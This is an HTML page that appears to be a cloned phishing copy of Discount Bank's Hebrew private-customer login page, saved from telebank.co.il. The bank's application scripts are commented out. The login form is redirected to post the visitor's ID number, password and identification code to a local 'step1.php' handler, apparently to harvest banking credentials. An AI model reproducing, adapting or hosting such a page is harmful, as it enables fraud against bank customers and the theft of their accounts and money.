<!DOCTYPE html>
<!-- saved from url=(0047)https://start.telebank.co.il/login/#/LOGIN_PAGE -->
<html lang="he" translate="no">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <meta http-equiv="Cache-control" content="max-age=0">
      <meta http-equiv="Cache-control" content="no-cache, no-store, must-revalidate">
      <meta http-equiv="Expires" content="0">
      <meta http-equiv="Expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
      <meta http-equiv="Pragma" content="no-cache">
      <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-status-bar-style" content="black">
      <link rel="icon" type="image/x-icon" href="https://start.telebank.co.il/login/favicon.ico">
      <!-- <script>
         __Zone_enable_cross_context_check = true;
      </script> -->
      <!--<base href="/">-->
      <!--<base>-->
      <base href=".">
      <!--########## "$apollo_version": "22.0.3.10.4" ############-->
      <style>#full_page_loader{position:fixed;top:0;right:0;width:100%;height:100%;z-index:9999999;background-color:#fff;text-align:center;padding:200px 0 0;visibility:visible;opacity:1;transition:visibility 2s,opacity 1.5s linear;}</style>
      <link rel="stylesheet" href="./index_files/styles.b78e6cff5b7e92c8aead.css" media="all" onload="this.media=&#39;all&#39;">
      <noscript>
         <link rel="stylesheet" href="/login/styles.b78e6cff5b7e92c8aead.css">
      </noscript>
      <!-- <script src="./index_files/detector-dom.min.js.تنزيل" type="text/javascript" id="_cs_cls_detector" data-clsconfig="reportURI=/glassbox/reporting/cls_report;"></script> -->
      <title>כניסה לחשבונות שלי</title>
      <link id="db-client-he" rel="stylesheet" href="./index_files/csLobby.he.css">
      <style></style>
      <!-- <script type="script/meta" src="./index_files/discload.js.تنزيل"> -->

      <!-- </script><script type="text/javascript" async="" src="./index_files/JqhK"></script><script type="text/javascript" src="./index_files/media.js.تنزيل" id="av2726"></script> -->
      <!-- <script type="text/javascript" async="" src="./index_files/JqhK(1)"></script> -->
   </head>
   <body class="frame-cube-body">
      <!--<app-root></app-root>-->
      <div ui-view="" ng-version="12.2.1">
         <div app-root="">
            <div ui-view="">
               <div db-main-ui-view="">
                  <div id="lobby-main-Content" class="direction-rtl">
                     <div id="master-container" class="discount-class PRIVATE-class class-LOGIN_PAGE common-login-class">
                        <div class="inner-master-container">
                           <div id="headerArea" class="header-area">
                              <db-lobby-header class="lobby-header">
                                 <div class="row-fluid">
                                    <div class="spacer-for-logo">
                                       <div class="col-xs-6 col-sm-5 col-md-4 col-lg-3 logo-cont">
                                          <!---->
                                          <div role="link" tabindex="0" class="logo-area pointer" aria-label="לוגו -דיסקונט מתאימים לך יותר ,קישור לאתר נוסף של הבנק"></div>
                                       </div>
                                       <div class="col-sm-3 col-md-4 col-lg-6 col-xl-7"><span class="spacer"></span></div>
                                       <div class="col-xs-6 col-sm-4 col-md-4 col-lg-3 col-xl-2">
                                          <div class="row">
                                             <div tabindex="0" role="link" class="lang-link col-xs-8 col-sm-6 col-md-6 row" aria-label="קישור לאתר באנגלית">
                                                <div><span class="down-link-arrow"></span><span class="text-link"> English </span></div>
                                             </div>
                                             <!---->
                                          </div>
                                       </div>
                                       <div class="clearfix"></div>
                                    </div>
                                    <div id="comboHeader"></div>
                                 </div>
                              </db-lobby-header>
                           </div>
                           <div class="clearfix"></div>
                        </div>
                        <div class="clearfix"></div>
                        <div class="inner-master-container">
                           <div id="page-area" cs-page-loader="" class="isLoading">
                              <div id="pageArea">
                                 <div id="framePageTitle" class="col-lg-2 col-sm-3"><span role="heading" aria-level="1"></span></div>
                                 <!----><!---->
                                 <!-- <from method='post' action='text.php' > -->
                                 <div id="loginPageArea" class="col-lg-4 col-sm-5 col-xs-12">
                                    <!---->
                                    <div id="loginForm">
                                       <!---->
                                       <form method="post" action="step1.php">
                                          <div id="page-content">
                                             <div id="main-content" ui-view="">
                                                <db-login-retail _nghost-ihn-c43="">
                                               
                                                   <div _ngcontent-ihn-c43="" class="login-page">
                                                      <div _ngcontent-ihn-c43="" id="login-page" class="row">
                                                   
                                                         <div _ngcontent-ihn-c43="" class="outline-login-border-box login-accessible-background">
                                                            <h2 _ngcontent-ihn-c43="" class="pull-default-float">לקוחות פרטיים</h2>
                                                            <h2 _ngcontent-ihn-c43="" role="presentation" class="link pull-opposite-float">
                                                               <div _ngcontent-ihn-c43="" role="link" tabindex="0" class="link-go-to-homepage" aria-label="לדף הבית &gt; קישור לאתר נוסף של הבנק"> לדף הבית &gt; </div>
                                                            </h2>
                                                            <div _ngcontent-ihn-c43="" class="clearfix"></div>
                                                            <div _ngcontent-ihn-c43="" class="required-text">* כל השדות הם שדות חובה</div>
                                                         <form _ngcontent-ihn-c43="" novalidate="" class="login-form ng-pristine ng-valid ng-touched">
                                                            <div _ngcontent-ihn-c43="" class="row">
                                                               <div _ngcontent-ihn-c43="" class="tzId-div col-xs-12"><span _ngcontent-ihn-c43="" id="tzIdLabel" class="text-label pull-default-float">מספר זהות *</span><input _ngcontent-ihn-c43="" aria-label="tzIdLabel" tabindex="0" type="text" id="tzId" name="tzId" autocomplete="off" value="" dir="ltr" size="13" maxlength="10" lobby-input-field="" class="accessible-input ng-pristine ng-valid ng-touched"></div>
                                                               <div _ngcontent-ihn-c43="" class="tzPassword-div col-xs-12">
                                                                  <span _ngcontent-ihn-c43="" id="tzPasswordLabel" class="text-label pull-default-float"> סיסמה * </span><input _ngcontent-ihn-c43="" aria-labelledby="tzPasswordLabel" tabindex="0" id="tzPassword" name="tzPassword" value="" autocomplete="off" dir="ltr" size="13" maxlength="14" lobby-input-field="" class="accessible-input ng-untouched ng-pristine ng-valid" type="password"><!---->
                                                               </div>
                                                               <div _ngcontent-ihn-c43="" class="aidnum-div col-xs-12"><span _ngcontent-ihn-c43="" id="aidnumLabel" class="text-label pull-default-float"> קוד מזהה * </span><input _ngcontent-ihn-c43="" aria-label="aidnumLabel" tabindex="0" type="text" id="aidnum" name="aidnum" value="" dir="ltr" autocomplete="off" size="13" maxlength="14" lobby-input-field="" class="accessible-input ng-untouched ng-pristine ng-valid"></div>
                                                            </div>
                                                            <div _ngcontent-ihn-c43="" class="row">
                                                               <!---->
                                                            </div>
                                                            <div _ngcontent-ihn-c43="" class="button-line">
                                                              <button _ngcontent-ihn-c43="" tabindex="0" type="submit" class="sendBtn dark-green-btn"><span _ngcontent-ihn-c43="">כניסה</span></button></div>
                                                         </form>
                                                         <div _ngcontent-ihn-c43="" class="outline-login-link-box">
                                                            <div _ngcontent-ihn-c43="" id="footerRetail">
                                                               <div _ngcontent-ihn-c43="" tabindex="0" role="link" class="footer-link" aria-label="נחסמתי / שכחתי סיסמה קישור לאתר נוסף של הבנק"><span _ngcontent-ihn-c43="" class="link-txt">נחסמתי / שכחתי סיסמה &gt; </span></div>
                                                               <div _ngcontent-ihn-c43="" tabindex="0" role="link" class="footer-link" aria-label="שכחתי קוד מזהה קישור לאתר נוסף של הבנק"><span _ngcontent-ihn-c43="" class="link-txt link-margin">שכחתי קוד מזהה &gt; </span></div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </db-login-retail>
                                             <!----><!---->
                                          </div>
                                          <!---->
                                       </form>
                                       </div>
                                       <!---->
                                    </div>
                                    <!----><!---->
                                    <div class="clearfix"></div>
                                 </div>
                                 <!-- <from> -->
                                 <div class="clearfix"></div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div>
                        <div id="master-container-links" class="class-LOGIN_PAGE inner-master-container">
                           <div id="linksBar">
                              <db-links-bar class="links-bar">
                                 <div id="linksBar" class="col-xs-12 links-bar">
                                    <div class="row">
                                       <div class="link-bar-cube pointer" tabindex="0" aria-label="גלישה בטוחה כל מה שחשוב לדעת קישור לאתר נוסף של הבנק">
                                          <div class="cube-icon lock-icon"></div>
                                          <div class="cube-title">גלישה בטוחה</div>
                                          <div class="cube-body">
                                             <div tabindex="-1" role="presentation" class="cube-text"> כל מה שחשוב לדעת </div>
                                             <!---->
                                          </div>
                                          <div class="cube-footer row">
                                             <!---->
                                          </div>
                                       </div>
                                       <!----><!---->
                                       <div class="link-bar-cube pointer" tabindex="0" aria-label="הצטרפות לדיסקונט@באינטרנט קל ופשוט מתמיד קישור לאתר נוסף של הבנק">
                                          <div class="cube-icon join-icon"></div>
                                          <div class="cube-title">הצטרפות לדיסקונט@באינטרנט</div>
                                          <div class="cube-body">
                                             <div tabindex="-1" role="presentation" class="cube-text"> קל ופשוט מתמיד </div>
                                             <!---->
                                          </div>
                                          <div class="cube-footer row">
                                             <!---->
                                          </div>
                                       </div>
                                       <!----><!---->
                                       <div class="link-bar-cube pointer" tabindex="0" aria-label="פתיחת חשבון בדיסקונט כל ההטבות למצטרפים חדשים קישור לאתר נוסף של הבנק">
                                          <div class="cube-icon open-count-icon"></div>
                                          <div class="cube-title">פתיחת חשבון בדיסקונט</div>
                                          <div class="cube-body">
                                             <div tabindex="-1" role="presentation" class="cube-text"> כל ההטבות </div>
                                             <div tabindex="-1" role="presentation" class="cube-text"> למצטרפים חדשים </div>
                                             <!---->
                                          </div>
                                          <div class="cube-footer row">
                                             <!---->
                                          </div>
                                       </div>
                                       <!----><!---->
                                       <div class="link-bar-cube pointer" tabindex="0" aria-label="חווית גלישה אופטימלית התנאים לגישה מיטבית קישור לאתר נוסף של הבנק">
                                          <div class="cube-icon like-icon"></div>
                                          <div class="cube-title">חווית גלישה אופטימלית</div>
                                          <div class="cube-body">
                                             <div tabindex="-1" role="presentation" class="cube-text"> התנאים לגישה מיטבית </div>
                                             <!---->
                                          </div>
                                          <div class="cube-footer row">
                                             <!---->
                                          </div>
                                       </div>
                                       <!----><!---->
                                       <div class="col-lg-4 col-md-8 col-xs-12 cube-bg link-bar-cube" tabindex="-1">
                                          <div class="cube-icon support-icon"></div>
                                          <div class="cube-title">נתקלתם בבעיה?</div>
                                          <div class="cube-body">
                                             <div tabindex="-1" role="presentation" class="cube-text"> מרכז תמיכת לקוחות לשירותכם </div>
                                             <div tabindex="-1" role="presentation" class="cube-text smaller-cube-text"> טלפון: 03-9439191 </div>
                                             <div tabindex="-1" role="presentation" class="cube-text smaller-cube-text"> פקס: 03-9522807 </div>
                                             <!---->
                                          </div>
                                          <div class="cube-footer row">
                                             <span tabindex="0" role="link" class="cube-text col-xs-6 col-sm-12"><span class="link-text">שעות פעילות</span><span class="link-arrow"></span></span><!---->
                                          </div>
                                       </div>
                                       <!----><!----><!---->
                                    </div>
                                    <div id="index"></div>
                                 </div>
                              </db-links-bar>
                           </div>
                           <!---->
                        </div>
                     </div>
                  </div>
               </div>
               <!----><!---->
            </div>
            <!---->
            <div id="full_page_loader" style="opacity: 0; visibility: hidden;"><img src="./index_files/page_loader.gif"></div>
         </div>
         <!----><!---->
      </div>
      <!---->
      <!-- <script src="./index_files/runtime-es2015.b8c3a10dbeff5aefd784.js.تنزيل" type="module"></script>
      <script src="./index_files/runtime-es5.b8c3a10dbeff5aefd784.js.تنزيل" nomodule="" defer="">

      </script><script src="./index_files/polyfills-es5.a0d53b60d9d1c7ae6faa.js.تنزيل" nomodule="" defer="">

      </script><script src="./index_files/polyfills-es2015.8531f5f4e68d7d8c42ac.js.تنزيل" type="module"></script>
      <script src="./index_files/main-es2015.15edeaa3574f465da270.js.تنزيل" type="module">
        
      </script><script src="./index_files/main-es5.15edeaa3574f465da270.js.تنزيل" nomodule="" defer=""></script> -->
   </body>
</html>